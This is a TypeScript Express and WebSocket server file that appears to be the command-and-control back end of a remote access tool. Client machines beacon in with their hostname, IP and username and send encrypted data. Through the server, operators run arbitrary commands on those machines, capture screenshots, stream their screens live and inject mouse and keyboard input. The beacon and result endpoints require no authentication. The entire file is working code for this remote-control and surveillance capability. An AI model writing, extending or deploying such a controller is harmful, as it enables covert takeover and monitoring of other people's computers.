import type { Express, Request, Response, NextFunction } from "express";
import { createServer, type Server } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { storage } from "./storage";
import { z } from "zod";
import { 
  loginSchema, 
  clientBeaconSchema, 
  executeCommandSchema, 
  commandResultSchema, 
  streamRequestSchema, 
  screenshotRequestSchema,
  clientActionSchema
} from "@shared/schema";
import { initializeEncryption, getEncryption } from "./encryption";
import { authenticateUser, authenticateByApiKey, initializeStorage } from "./auth";
import session from "express-session";
import createMemoryStore from "memorystore";
import crypto from "crypto";

// Initialize session store
const MemoryStore = createMemoryStore(session);

// WebSocket client tracking
interface ConnectedClient {
  socket: WebSocket;
  clientId: string;
  isAdmin: boolean;
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Health check endpoint for Render deployment
  app.get('/api/health', async (req, res) => {
    try {
      // Basic health check
      res.json({ 
        status: 'ok',
        timestamp: new Date().toISOString(),
        environment: process.env.NODE_ENV || 'development'
      });
    } catch (error) {
      log(`Health check error: ${error}`, 'health');
      res.status(500).json({ status: 'error', message: 'Health check failed' });
    }
  });
  const httpServer = createServer(app);
  
  // Initialize settings and encryption
  const encryptionKeySetting = await storage.getSetting("encryptionKey");
  if (encryptionKeySetting) {
    initializeEncryption(encryptionKeySetting.value);
  } else {
    // Generate a random key if not found
    const randomKey = crypto.randomBytes(32).toString('base64');
    await storage.createSetting({
      key: "encryptionKey",
      value: randomKey,
      description: "AES-256 encryption key for client communications"
    });
    initializeEncryption(randomKey);
  }
  
  // Initialize storage with admin user
  await initializeStorage();
  
  // Session middleware
  app.use(
    session({
      cookie: { maxAge: 1000 * 60 * 60 * 24 }, // 24 hours
      store: new MemoryStore({
        checkPeriod: 1000 * 60 * 60 // Clear expired entries every hour
      }),
      resave: false,
      saveUninitialized: false,
      secret: crypto.randomBytes(32).toString('hex')
    })
  );
  
  // Authentication middleware
  const requireAuth = (req: Request, res: Response, next: NextFunction) => {
    // Allow beacon and command result endpoints without session auth
    if (req.path.startsWith('/api/beacon') || req.path.startsWith('/api/command/result')) {
      return next();
    }
    
    // Check for API key in headers
    const apiKey = req.headers['x-api-key'] as string;
    if (apiKey) {
      authenticateByApiKey(apiKey)
        .then(user => {
          if (user) {
            req.session.user = user;
            return next();
          }
          return res.status(401).json({ message: "Invalid API key" });
        })
        .catch(err => {
          console.error('API key auth error:', err);
          return res.status(500).json({ message: "Authentication error" });
        });
      return;
    }
    
    // Check for session auth
    if (req.session.user) {
      return next();
    }
    
    return res.status(401).json({ message: "Authentication required" });
  };
  
  // Setup WebSocket server
  const wss = new WebSocketServer({ server: httpServer, path: '/ws' });
  
  // Track all connected clients
  const connectedClients: ConnectedClient[] = [];
  
  // Handle WebSocket connections
  wss.on('connection', (socket, req) => {
    let clientId: string | null = null;
    let isAdmin = false;
    
    console.log('WebSocket connection established');
    
    // Parse query parameters to determine client type
    const url = new URL(req.url || '', `http://${req.headers.host}`);
    const queryClientId = url.searchParams.get('clientId');
    const apiKey = url.searchParams.get('apiKey');
    
    // Handle authentication
    if (apiKey) {
      // Check if API key is valid (admin)
      authenticateByApiKey(apiKey)
        .then(user => {
          if (user) {
            console.log('Admin authenticated via WebSocket');
            isAdmin = true;
            
            // Add to connected clients
            const client: ConnectedClient = { socket, clientId: 'admin', isAdmin };
            connectedClients.push(client);
            
            // Send initial clients list to admin
            storage.getActiveClients().then(clients => {
              const message = JSON.stringify({
                type: 'clientsList',
                clients: clients
              });
              socket.send(message);
            });
          } else {
            console.log('Invalid API key for WebSocket connection');
            socket.close(1008, 'Invalid API key');
          }
        })
        .catch(err => {
          console.error('WebSocket auth error:', err);
          socket.close(1011, 'Authentication error');
        });
    }
    else if (queryClientId) {
      // This is a client connection
      clientId = queryClientId;
      console.log(`Client ${clientId} connected via WebSocket`);
      
      // Check if client exists in storage
      storage.getClientByClientId(clientId)
        .then(client => {
          if (client) {
            // Update last seen time
            storage.updateClientLastSeen(clientId!);
            
            // Add to connected clients
            const wsClient: ConnectedClient = { socket, clientId: clientId!, isAdmin: false };
            connectedClients.push(wsClient);
            
            // Notify admins of client connection
            broadcastToAdmins({
              type: 'clientConnected',
              clientId: clientId,
              timestamp: new Date().toISOString()
            });
            
            // Create connection activity
            storage.createActivity({
              clientId: clientId!,
              type: 'connection',
              description: `WebSocket connection established with ${clientId}`,
              data: null
            });
          } else {
            // Client not registered
            console.log(`Unknown client tried to connect: ${clientId}`);
            socket.close(1008, 'Client not registered');
          }
        });
    }
    else {
      // Neither admin nor client with ID
      console.log('WebSocket connection without proper identification');
      socket.close(1008, 'Missing identification');
    }
    
    // Handle incoming messages
    socket.on('message', async (message: Buffer) => {
      try {
        const data = JSON.parse(message.toString());
        
        // Handle message based on type
        if (data.type === 'screenshot' && clientId) {
          // Client sent a screenshot
          console.log(`Received screenshot from ${clientId}`);
          
          // Forward to admin clients
          broadcastToAdmins({
            type: 'screenshot',
            clientId,
            image: data.image,
            timestamp: new Date().toISOString()
          });
          
          // Create activity
          await storage.createActivity({
            clientId,
            type: 'screenshot',
            description: `Screenshot received from ${clientId}`,
            data: null
          });
        }
        else if (data.type === 'streamFrame' && clientId) {
          // Client sent a stream frame
          
          // Forward to admin clients without storing
          broadcastToAdmins({
            type: 'streamFrame',
            clientId,
            frame: data.frame,
            timestamp: new Date().toISOString()
          });
        }
        else if (data.type === 'commandResult' && clientId) {
          // Client sent a command result
          console.log(`Received command result from ${clientId}`);
          
          // Update command in storage
          await storage.updateCommandStatus(
            data.commandId, 
            'completed', 
            data.output
          );
          
          // Forward to admin clients
          broadcastToAdmins({
            type: 'commandResult',
            clientId,
            commandId: data.commandId,
            output: data.output,
            timestamp: new Date().toISOString()
          });
          
          // Create activity
          await storage.createActivity({
            clientId,
            type: 'commandResult',
            description: `Command result received from ${clientId}`,
            data: { commandId: data.commandId }
          });
        }
        else if (data.type === 'executeCommand' && isAdmin) {
          // Admin wants to execute a command
          console.log(`Admin executing command on ${data.clientId}`);
          
          // Store command
          const command = await storage.createCommand({
            clientId: data.clientId,
            command: data.command,
            status: 'pending'
          });
          
          // Send to specific client
          sendToClient(data.clientId, {
            type: 'executeCommand',
            commandId: command.id,
            command: data.command
          });
        }
        else if (data.type === 'requestScreenshot' && isAdmin) {
          // Admin requesting screenshot
          console.log(`Admin requesting screenshot from ${data.clientId}`);
          
          // Create activity
          await storage.createActivity({
            clientId: data.clientId,
            type: 'screenshotRequest',
            description: `Screenshot requested for ${data.clientId}`,
            data: null
          });
          
          // Send to client
          sendToClient(data.clientId, {
            type: 'takeScreenshot',
            quality: data.quality || 50
          });
        }
        else if (data.type === 'streamControl' && isAdmin) {
          // Admin controlling stream
          console.log(`Admin ${data.action} stream for ${data.clientId}`);
          
          // Create activity
          await storage.createActivity({
            clientId: data.clientId,
            type: data.action === 'start' ? 'streamStart' : 'streamStop',
            description: `Screen stream ${data.action} for ${data.clientId}`,
            data: { fps: data.fps, quality: data.quality }
          });
          
          // Send to client
          sendToClient(data.clientId, {
            type: 'streamControl',
            action: data.action,
            fps: data.fps || 5,
            quality: data.quality || 30
          });
        }
        else if (data.type === 'clientAction' && isAdmin) {
          // Admin sending mouse/keyboard action
          console.log(`Admin sending ${data.action} to ${data.clientId}`);
          
          // Send to client
          sendToClient(data.clientId, {
            type: 'clientAction',
            action: data.action,
            data: data.data
          });
        }
      } catch (err) {
        console.error('Error handling WebSocket message:', err);
      }
    });
    
    // Handle disconnection
    socket.on('close', async () => {
      console.log(`WebSocket connection closed ${clientId || 'admin'}`);
      
      // Remove from connected clients
      const index = connectedClients.findIndex(c => 
        c.socket === socket && c.clientId === (clientId || 'admin')
      );
      
      if (index !== -1) {
        connectedClients.splice(index, 1);
      }
      
      if (clientId) {
        // Update client status in database to idle
        await storage.updateClient(clientId, { status: 'idle' });
        
        // Create disconnection activity
        await storage.createActivity({
          clientId,
          type: 'disconnection',
          description: `WebSocket connection closed with ${clientId}`,
          data: null
        });
        
        // Notify admins
        broadcastToAdmins({
          type: 'clientDisconnected',
          clientId,
          timestamp: new Date().toISOString()
        });
      }
    });
  });
  
  // Helper function to send message to a specific client
  function sendToClient(clientId: string, message: any) {
    const client = connectedClients.find(c => c.clientId === clientId && !c.isAdmin);
    if (client && client.socket.readyState === WebSocket.OPEN) {
      client.socket.send(JSON.stringify(message));
      return true;
    }
    return false;
  }
  
  // Helper function to broadcast to all admin clients
  function broadcastToAdmins(message: any) {
    const adminClients = connectedClients.filter(c => c.isAdmin);
    adminClients.forEach(client => {
      if (client.socket.readyState === WebSocket.OPEN) {
        client.socket.send(JSON.stringify(message));
      }
    });
  }
  
  // Helper function to verify data against schema
  function validateSchema<T>(schema: z.ZodSchema<T>, data: unknown): data is T {
    const result = schema.safeParse(data);
    return result.success;
  }
  
  // =====================
  // API Routes
  // =====================
  
  // Authentication
  app.post('/api/auth/login', async (req, res) => {
    try {
      if (!validateSchema(loginSchema, req.body)) {
        return res.status(400).json({ message: "Invalid login data" });
      }
      
      const { username, password } = req.body;
      const user = await authenticateUser(username, password);
      
      if (!user) {
        return res.status(401).json({ message: "Invalid credentials" });
      }
      
      // Store user in session
      req.session.user = user;
      
      return res.status(200).json({ 
        message: "Authentication successful",
        user
      });
    } catch (error) {
      console.error('Login error:', error);
      return res.status(500).json({ message: "Internal server error" });
    }
  });
  
  app.post('/api/auth/logout', (req, res) => {
    req.session.destroy((err) => {
      if (err) {
        return res.status(500).json({ message: "Logout failed" });
      }
      
      return res.status(200).json({ message: "Logged out successfully" });
    });
  });
  
  app.get('/api/auth/check', (req, res) => {
    if (req.session.user) {
      return res.status(200).json({ 
        authenticated: true,
        user: req.session.user
      });
    }
    
    return res.status(200).json({ 
      authenticated: false 
    });
  });
  
  // Client beacon endpoint (initial connection and heartbeat)
  app.post('/api/beacon', async (req, res) => {
    try {
      if (!validateSchema(clientBeaconSchema, req.body)) {
        return res.status(400).json({ message: "Invalid beacon data" });
      }
      
      const { clientId, systemInfo, data } = req.body;
      
      // Check if we have encrypted data to decrypt
      let decryptedData = null;
      if (data) {
        try {
          decryptedData = getEncryption().decrypt(data);
          // Parse JSON data if needed
          // decryptedData = JSON.parse(decryptedData);
        } catch (err) {
          console.error('Beacon data decryption error:', err);
        }
      }
      
      let existingClient = null;
      
      if (clientId) {
        // This is a heartbeat from existing client
        existingClient = await storage.getClientByClientId(clientId);
        
        if (existingClient) {
          // Update last seen timestamp
          await storage.updateClientLastSeen(clientId);
          
          // Check for pending commands
          const pendingCommands = await storage.getPendingCommands(clientId);
          
          // Prepare response
          const response: any = {
            status: "success",
            timestamp: new Date().toISOString(),
            pendingCommands: pendingCommands.map(cmd => ({
              id: cmd.id,
              command: cmd.command
            }))
          };
          
          // Get screenshot/stream settings from storage
          const [screenshotQuality, streamQuality, frameRate] = await Promise.all([
            storage.getSetting("screenshotQuality"),
            storage.getSetting("streamQuality"),
            storage.getSetting("frameRate")
          ]);
          
          if (screenshotQuality && streamQuality && frameRate) {
            response.settings = {
              screenshotQuality: parseInt(screenshotQuality.value, 10),
              streamQuality: parseInt(streamQuality.value, 10),
              frameRate: parseInt(frameRate.value, 10)
            };
          }
          
          return res.status(200).json(response);
        }
        
        // Client ID not found, treat as new client
      }
      
      // This is a new client, register it
      const newClientId = clientId || crypto.randomBytes(4).toString('hex');
      
      const clientData = {
        clientId: newClientId,
        hostname: systemInfo.hostname,
        ip: systemInfo.ip,
        platform: systemInfo.platform,
        platformRelease: systemInfo.platformRelease,
        platformVersion: systemInfo.platformVersion,
        architecture: systemInfo.architecture,
        processor: systemInfo.processor,
        username: systemInfo.username,
        screenResolution: systemInfo.screenResolution,
        status: 'active',
        additionalInfo: decryptedData
      };
      
      const client = await storage.createClient(clientData);
      
      // Notify all admin WebSocket clients
      broadcastToAdmins({
        type: 'newClient',
        client,
        timestamp: new Date().toISOString()
      });
      
      // Prepare encrypted response with client ID
      const responseData = {
        clientId: client.clientId,
        timestamp: new Date().toISOString(),
        status: "registered"
      };
      
      const encryptedResponse = getEncryption().encrypt(JSON.stringify(responseData));
      
      return res.status(200).json({
        status: "success",
        data: encryptedResponse
      });
    } catch (error) {
      console.error('Beacon processing error:', error);
      return res.status(500).json({ message: "Internal server error" });
    }
  });
  
  // Command result endpoint
  app.post('/api/command/result', async (req, res) => {
    try {
      if (!validateSchema(commandResultSchema, req.body)) {
        return res.status(400).json({ message: "Invalid command result data" });
      }
      
      const { clientId, commandId, output, status } = req.body;
      
      // Update the command in storage
      const updatedCommand = await storage.updateCommandStatus(commandId, status, output);
      
      if (!updatedCommand) {
        return res.status(404).json({ message: "Command not found" });
      }
      
      // Create activity for command result
      await storage.createActivity({
        clientId,
        type: 'commandResult',
        description: `Command result received from ${clientId}`,
        data: { commandId, status }
      });
      
      // Notify admin clients via WebSocket
      broadcastToAdmins({
        type: 'commandResult',
        clientId,
        commandId,
        output,
        status,
        timestamp: new Date().toISOString()
      });
      
      return res.status(200).json({ message: "Command result processed" });
    } catch (error) {
      console.error('Command result processing error:', error);
      return res.status(500).json({ message: "Internal server error" });
    }
  });
  
  // Screenshot upload endpoint
  app.post('/api/screenshot/:clientId', async (req, res) => {
    try {
      const { clientId } = req.params;
      const { image } = req.body;
      
      if (!clientId || !image) {
        return res.status(400).json({ message: "Missing client ID or image data" });
      }
      
      // Validate client exists
      const client = await storage.getClientByClientId(clientId);
      if (!client) {
        return res.status(404).json({ message: "Client not found" });
      }
      
      // Create activity for screenshot
      await storage.createActivity({
        clientId,
        type: 'screenshot',
        description: `Screenshot received from ${clientId}`,
        data: null
      });
      
      // Notify admin clients via WebSocket
      broadcastToAdmins({
        type: 'screenshot',
        clientId,
        image,
        timestamp: new Date().toISOString()
      });
      
      return res.status(200).json({ message: "Screenshot processed" });
    } catch (error) {
      console.error('Screenshot processing error:', error);
      return res.status(500).json({ message: "Internal server error" });
    }
  });
  
  // Protected routes - require authentication
  
  // Get clients list
  app.get('/api/clients', requireAuth, async (req, res) => {
    try {
      const clients = await storage.getAllClients();
      return res.status(200).json(clients);
    } catch (error) {
      console.error('Get clients error:', error);
      return res.status(500).json({ message: "Internal server error" });
    }
  });
  
  // Get active clients
  app.get('/api/clients/active', requireAuth, async (req, res) => {
    try {
      const clients = await storage.getActiveClients();
      return res.status(200).json(clients);
    } catch (error) {
      console.error('Get active clients error:', error);
      return res.status(500).json({ message: "Internal server error" });
    }
  });
  
  // Get client details
  app.get('/api/clients/:clientId', requireAuth, async (req, res) => {
    try {
      const { clientId } = req.params;
      const client = await storage.getClientByClientId(clientId);
      
      if (!client) {
        return res.status(404).json({ message: "Client not found" });
      }
      
      return res.status(200).json(client);
    } catch (error) {
      console.error('Get client details error:', error);
      return res.status(500).json({ message: "Internal server error" });
    }
  });
  
  // Execute command on client
  app.post('/api/commands', requireAuth, async (req, res) => {
    try {
      if (!validateSchema(executeCommandSchema, req.body)) {
        return res.status(400).json({ message: "Invalid command data" });
      }
      
      const { clientId, command } = req.body;
      
      // Validate client exists
      const client = await storage.getClientByClientId(clientId);
      if (!client) {
        return res.status(404).json({ message: "Client not found" });
      }
      
      // Store command in database
      const newCommand = await storage.createCommand({
        clientId,
        command,
        status: 'pending'
      });
      
      // Try to send command via WebSocket if client is connected
      const sent = sendToClient(clientId, {
        type: 'executeCommand',
        commandId: newCommand.id,
        command
      });
      
      // Return the command
      return res.status(200).json({
        command: newCommand,
        sentViaWebSocket: sent
      });
    } catch (error) {
      console.error('Execute command error:', error);
      return res.status(500).json({ message: "Internal server error" });
    }
  });
  
  // Get commands history
  app.get('/api/commands', requireAuth, async (req, res) => {
    try {
      const commands = await storage.getAllCommands();
      return res.status(200).json(commands);
    } catch (error) {
      console.error('Get commands error:', error);
      return res.status(500).json({ message: "Internal server error" });
    }
  });
  
  // Get client commands
  app.get('/api/clients/:clientId/commands', requireAuth, async (req, res) => {
    try {
      const { clientId } = req.params;
      const commands = await storage.getCommandsByClientId(clientId);
      return res.status(200).json(commands);
    } catch (error) {
      console.error('Get client commands error:', error);
      return res.status(500).json({ message: "Internal server error" });
    }
  });
  
  // Request screenshot from client
  app.post('/api/clients/:clientId/screenshot', requireAuth, async (req, res) => {
    try {
      const { clientId } = req.params;
      
      if (!validateSchema(screenshotRequestSchema, { clientId, ...req.body })) {
        return res.status(400).json({ message: "Invalid screenshot request" });
      }
      
      const { quality = 50 } = req.body;
      
      // Validate client exists
      const client = await storage.getClientByClientId(clientId);
      if (!client) {
        return res.status(404).json({ message: "Client not found" });
      }
      
      // Create activity
      await storage.createActivity({
        clientId,
        type: 'screenshotRequest',
        description: `Screenshot requested for ${clientId}`,
        data: { quality }
      });
      
      // Try to send request via WebSocket
      const sent = sendToClient(clientId, {
        type: 'takeScreenshot',
        quality
      });
      
      return res.status(200).json({
        message: "Screenshot request sent",
        sent: sent
      });
    } catch (error) {
      console.error('Screenshot request error:', error);
      return res.status(500).json({ message: "Internal server error" });
    }
  });
  
  // Control stream for client
  app.post('/api/clients/:clientId/stream', requireAuth, async (req, res) => {
    try {
      const { clientId } = req.params;
      
      if (!validateSchema(streamRequestSchema, { clientId, ...req.body })) {
        return res.status(400).json({ message: "Invalid stream request" });
      }
      
      const { quality = 30, fps = 5, action } = req.body;
      
      // Validate client exists
      const client = await storage.getClientByClientId(clientId);
      if (!client) {
        return res.status(404).json({ message: "Client not found" });
      }
      
      // Create activity
      await storage.createActivity({
        clientId,
        type: action === 'start' ? 'streamStart' : 'streamStop',
        description: `Screen stream ${action} for ${clientId}`,
        data: { fps, quality }
      });
      
      // Try to send request via WebSocket
      const sent = sendToClient(clientId, {
        type: 'streamControl',
        action,
        fps,
        quality
      });
      
      return res.status(200).json({
        message: `Stream ${action} request sent`,
        sent: sent
      });
    } catch (error) {
      console.error('Stream control error:', error);
      return res.status(500).json({ message: "Internal server error" });
    }
  });
  
  // Send mouse/keyboard action to client
  app.post('/api/clients/:clientId/action', requireAuth, async (req, res) => {
    try {
      const { clientId } = req.params;
      
      if (!validateSchema(clientActionSchema, { clientId, ...req.body })) {
        return res.status(400).json({ message: "Invalid client action" });
      }
      
      const { action, data } = req.body;
      
      // Validate client exists
      const client = await storage.getClientByClientId(clientId);
      if (!client) {
        return res.status(404).json({ message: "Client not found" });
      }
      
      // Try to send action via WebSocket
      const sent = sendToClient(clientId, {
        type: 'clientAction',
        action,
        data
      });
      
      return res.status(200).json({
        message: `Client action ${action} sent`,
        sent: sent
      });
    } catch (error) {
      console.error('Client action error:', error);
      return res.status(500).json({ message: "Internal server error" });
    }
  });
  
  // Get recent activities
  app.get('/api/activities', requireAuth, async (req, res) => {
    try {
      const limit = req.query.limit ? parseInt(req.query.limit as string, 10) : 20;
      const activities = await storage.getRecentActivities(limit);
      return res.status(200).json(activities);
    } catch (error) {
      console.error('Get activities error:', error);
      return res.status(500).json({ message: "Internal server error" });
    }
  });
  
  // Get client activities
  app.get('/api/clients/:clientId/activities', requireAuth, async (req, res) => {
    try {
      const { clientId } = req.params;
      const activities = await storage.getActivitiesByClientId(clientId);
      return res.status(200).json(activities);
    } catch (error) {
      console.error('Get client activities error:', error);
      return res.status(500).json({ message: "Internal server error" });
    }
  });
  
  // Get server stats
  app.get('/api/stats', requireAuth, async (req, res) => {
    try {
      const stats = await storage.getStats();
      return res.status(200).json(stats);
    } catch (error) {
      console.error('Get stats error:', error);
      return res.status(500).json({ message: "Internal server error" });
    }
  });
  
  // Get settings
  app.get('/api/settings', requireAuth, async (req, res) => {
    try {
      const settings = await storage.getAllSettings();
      return res.status(200).json(settings);
    } catch (error) {
      console.error('Get settings error:', error);
      return res.status(500).json({ message: "Internal server error" });
    }
  });
  
  // Update settings
  app.put('/api/settings/:key', requireAuth, async (req, res) => {
    try {
      const { key } = req.params;
      const { value } = req.body;
      
      if (!key || value === undefined) {
        return res.status(400).json({ message: "Missing key or value" });
      }
      
      const setting = await storage.updateSetting(key, value);
      
      if (!setting) {
        return res.status(404).json({ message: "Setting not found" });
      }
      
      // If encryption key was updated, reinitialize encryption
      if (key === 'encryptionKey') {
        initializeEncryption(value);
      }
      
      return res.status(200).json(setting);
    } catch (error) {
      console.error('Update setting error:', error);
      return res.status(500).json({ message: "Internal server error" });
    }
  });
  
  return httpServer;
}
